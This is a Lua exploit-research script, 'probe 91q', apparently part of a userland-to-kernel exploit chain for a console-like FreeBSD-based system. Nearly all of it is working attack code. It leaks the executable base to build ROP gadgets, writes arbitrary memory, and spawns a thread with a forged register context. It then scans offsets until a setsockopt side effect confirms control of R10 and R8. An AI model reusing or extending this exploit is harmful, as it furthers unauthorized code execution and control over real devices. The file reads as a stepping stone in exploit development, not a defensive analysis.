-- CRASH_CLASS: LOW
-- PROBE 91q: R10/R8 offset scan — child writes NOTHING to userland
--
-- Root cause of 91p corruption: child's WMOV writes to memory.alloc
-- address that overlaps Lua VM state. Fix: child does NO writes.
--
-- Method:
-- 1. Main: create IPv6 socket, set UNICAST_HOPS=42
-- 2. Child: setsockopt(s6, 41, 4, optval, 4) via syscall;ret
--    Then nanosleep(999s) — NO shared buffer writes
-- 3. Main: getsockopt UNICAST_HOPS — if 77, offsets confirmed
--
-- Single memory.alloc(0x400) for ctx (reused).
-- Single mmap(2 pages) for stack + optval + timespecs.

print("=== PROBE 91q: R10 NOWRITE SCAN ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local tc=mk(430); local tk=mk(433); local mm=mk(477)

-- Eboot gadgets
local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
print("eboot="..string.format("0x%X%08X",ehi,elo))

-- Known ctx offsets
local _DI=0x048; local _SI=0x050; local _DX=0x058; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

-- Single mmap: 2 pages for stack + data
local pg=0x4000
local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(2*pg),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local base=N(region)

-- Layout in mmap:
-- +0x0000: optval (4 bytes) = 77
-- +0x0010: timespec nanosleep (16 bytes) = 999s
-- +0x0020: timespec short sleep (16 bytes) = 50ms
-- +0x0100: stack for child ROP chain (reused)
local optval=base
local ts_addr=base+0x10
local sl_addr=base+0x20
local stk=base+0x100

wd(optval,77)
wq(ts_addr,uint64(999)); wq(ts_addr+8,uint64(0))
wq(sl_addr,uint64(0)); wq(sl_addr+8,uint64(50000000))

-- Single memory.alloc for context (reused)
local ctx=memory.alloc(0x200)

-- Create IPv6 socket
local s6=N(native.fcall_with_rax(stub,97,28,2,0))
print("s6="..s6)
if s6<=0 then print("FAIL: no IPv6") return end

local function set_hops(val)
    local vb=memory.alloc(4); wd(vb,val)
    native.fcall_with_rax(stub,105,s6,41,4,N(vb),4)
end
local function get_hops()
    local gb=memory.alloc(8); z(gb,8)
    local gl=memory.alloc(4); wd(gl,4)
    native.fcall_with_rax(stub,118,s6,41,4,N(gb),N(gl))
    return rd(gb)
end

-- Verify baseline
set_hops(42)
print("baseline="..tostring(get_hops()))

-- ============================================================
-- Test function
-- ============================================================
local function test(r10_off, r8_off, label)
    set_hops(42)

    -- Build stack: after setsockopt, just nanosleep (NO writes)
    -- setsockopt returns, ret pops PRDI
    z(stk,0x80)
    local sp=stk
    wq(sp,PRDI); sp=sp+8        -- pop rdi; ret
    wq(sp,uint64(ts_addr)); sp=sp+8  -- rdi = ts_addr
    wq(sp,PRAX); sp=sp+8        -- pop rax; ret
    wq(sp,uint64(240)); sp=sp+8 -- rax = 240 (nanosleep)
    wq(sp,SA); sp=sp+8          -- syscall; ret → nanosleep

    -- Build context: setsockopt(s6, 41, 4, optval, 4)
    z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA)
    wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(105))     -- setsockopt
    wq(ctx+_DI,uint64(s6))      -- fd
    wq(ctx+_SI,uint64(41))      -- IPPROTO_IPV6
    wq(ctx+_DX,uint64(4))       -- IPV6_UNICAST_HOPS
    -- R10 candidate = optval pointer
    wq(ctx+r10_off,uint64(optval))
    -- R8 candidate = 4 (optlen)
    if r8_off ~= r10_off then
        wq(ctx+r8_off,uint64(4))
    end

    -- Spawn child
    local tb=memory.alloc(8); wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    local tid=rq(tb)

    -- Wait 50ms
    native.fcall_with_rax(stub,240,N(sl_addr),0)

    -- Check hops
    local hops=get_hops()
    local hit=(hops==77)

    -- Check child alive
    local alive=false
    if tid and N(tid)>0 then
        local kr=N(native.fcall_with_rax(stub,433,N(tid),0))
        alive=(kr==0)
        pcall(function() tk(tid,uint64(9)) end)
    end

    local tag=""
    if hit then tag=" *** HIT ***" end
    print(string.format("  %s h=%s a=%s%s",label,tostring(hops),tostring(alive),tag))
    return hit
end

-- ============================================================
-- Phase 1: Standard (R10=0x090, R8=0x068)
-- ============================================================
print("")
print("=P1=")
local found=test(0x090,0x068,"std")

-- ============================================================
-- Phase 2: Scan R10 with R8=0x068
-- ============================================================
if not found then
    print("=P2= R10 scan")
    local c={0x060,0x068,0x070,0x080,0x088,0x098,0x0A0,0x0A8,0x0B0,0x0B8}
    for _,r in ipairs(c) do
        found=test(r,0x068,string.format("%03X",r))
        if found then break end
    end
end

-- ============================================================
-- Phase 3: Scan R8 with R10=0x090
-- ============================================================
if not found then
    print("=P3= R8 scan")
    local c={0x060,0x070,0x080,0x088,0x098,0x0A0,0x0A8,0x0B0,0x0B8}
    for _,r in ipairs(c) do
        found=test(0x090,r,string.format("%03X",r))
        if found then break end
    end
end

-- ============================================================
-- Phase 4: Cross matrix
-- ============================================================
if not found then
    print("=P4= matrix")
    local all={0x060,0x068,0x070,0x080,0x088,0x090,0x098,0x0A0,0x0A8,0x0B0,0x0B8}
    for _,r10 in ipairs(all) do
        for _,r8 in ipairs(all) do
            if r10~=r8 then
                found=test(r10,r8,string.format("%03X/%03X",r10,r8))
                if found then break end
            end
        end
        if found then break end
    end
end

if not found then
    print("")
    print("*** NO R10/R8 OFFSET FOUND ***")
    print("set_mcontext likely does NOT restore R10/R8")
end

print("")
native.fcall_with_rax(stub,6,s6)
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91q DONE ===")
